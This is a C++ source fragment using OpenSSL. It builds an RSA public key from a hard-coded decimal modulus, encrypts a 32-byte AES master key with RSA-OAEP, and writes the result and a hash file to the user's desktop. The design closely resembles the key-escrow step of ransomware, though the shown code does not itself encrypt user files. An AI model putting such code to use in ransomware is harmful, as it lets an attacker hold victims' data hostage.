#include "common.hpp"

#include <openssl/rsa.h>
#include <openssl/bn.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <openssl/err.h>

#include <vector>
#include <string>
#include <fstream>
#include <stdexcept>
#include <filesystem>


const char* RSA_MODULUS_DEC =
    "716649957786104649335415321318785142102679893329902360623376180166607346553576354771450226026593534180087845795197942811762142584315838374413148843291975826065075375913670982155969038233609295711000534777012702652294817707297286707672913433336267393606810180234810588661092326928569978332390893638339605009470868208530588553294782571994432785889599876732074105057233873212255404828651175010207975612932486607601761932165464367018581296431071634442099002312790694169887169680188727673426694529623693812495290878412207224402945373969291986695177217375587601930630873087810944882377954670289697585302642526378771789429057826326157295208906318019924451436666687077231022123282881532444706156361003537654631705271332627961510273206162546633842227889493045984286569924673344316558678184173961353761407945896181974682834745492353227881677010035568435699466223925212630131325186485423446736512722897275370905361330319093841497120695090732462227717579894240171041122522902341221922472018676067198296601469428966383578255304228943766342435962755125603325510684716764952952016963634536128310943166825344709530691742038368019572405817582137968572824124018915520771877217454585309199385543640716217111267121040125672594184282109827183269228438623";
const unsigned long RSA_E = 65537;

RSA* CreatePublicKeyFromDecimalModulus(const char* modulusDec, unsigned long e) {
    BIGNUM* bn_n = BN_new();
    BIGNUM* bn_e = BN_new();
    if (!bn_n || !bn_e) {
        if (bn_n) BN_free(bn_n);
        if (bn_e) BN_free(bn_e);
        return nullptr;
    }

    if (BN_dec2bn(&bn_n, modulusDec) == 0) {
        BN_free(bn_n);
        BN_free(bn_e);
        return nullptr;
    }
    BN_set_word(bn_e, e);

    RSA* rsa = RSA_new();
    if (!rsa) {
        BN_free(bn_n);
        BN_free(bn_e);
        return nullptr;
    }
    RSA_set0_key(rsa, bn_n, bn_e, nullptr);
    return rsa;
}

std::vector<uint8_t> RSAEncryptOAEP(const std::vector<uint8_t>& plaintext, RSA* pubKey) {
    size_t rsaLen = RSA_size(pubKey);
    std::vector<uint8_t> encrypted(rsaLen);
    int len = RSA_public_encrypt(
        static_cast<int>(plaintext.size()),
        plaintext.data(),
        encrypted.data(),
        pubKey,
        RSA_PKCS1_OAEP_PADDING
    );
    if (len < 0) throw std::runtime_error("RSA encryption failed");
    encrypted.resize(static_cast<size_t>(len));
    return encrypted;
}
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/err.h>

void WriteEncryptedMasterKeyToFile(SecureBuffer& masterKey) {
    if (masterKey.size() != AES_256_KEY_SIZE)
        throw std::runtime_error("Master key must be 32 bytes");

    std::wstring desktop = GetUserDesktopPath();
    std::wstring encPath = desktop + L"\\masterkey.enc";
    std::wstring hashPath = desktop + L"\\masterkey.sha256";

    RSA* rsa = CreatePublicKeyFromDecimalModulus(RSA_MODULUS_DEC, RSA_E);
    if (!rsa) throw std::runtime_error("RSA key creation failed");

    EVP_PKEY* pubKey = EVP_PKEY_new();
    if (!pubKey) { RSA_free(rsa); throw std::runtime_error("EVP_PKEY_new failed"); }
    if (EVP_PKEY_assign_RSA(pubKey, rsa) != 1) {
        EVP_PKEY_free(pubKey);
        throw std::runtime_error("EVP_PKEY_assign_RSA failed");
    }

    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(pubKey, nullptr);
    if (!ctx) { EVP_PKEY_free(pubKey); throw std::runtime_error("EVP_PKEY_CTX_new failed"); }

    if (EVP_PKEY_encrypt_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0 ||
        EVP_PKEY_CTX_set_rsa_oaep_md(ctx, EVP_sha256()) <= 0 ||
        EVP_PKEY_CTX_set_rsa_mgf1_md(ctx, EVP_sha256()) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(pubKey);
        throw std::runtime_error("EVP configuration failed");
    }

    size_t outLen = 0;
    if (EVP_PKEY_encrypt(ctx, nullptr, &outLen, masterKey.data(), masterKey.size()) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(pubKey);
        throw std::runtime_error("EVP_PKEY_encrypt size failed");
    }

    std::vector<uint8_t> encrypted(outLen);
    if (EVP_PKEY_encrypt(ctx, encrypted.data(), &outLen, masterKey.data(), masterKey.size()) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(pubKey);
        throw std::runtime_error("EVP_PKEY_encrypt failed");
    }

    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(pubKey);

    
    std::ofstream out(std::filesystem::path(encPath), std::ios::binary | std::ios::trunc);
    if (!out) throw std::runtime_error("Cannot create master key file");
    out.write(reinterpret_cast<const char*>(encrypted.data()), outLen);
    out.close();

    SaveKeyHash(masterKey, hashPath);
}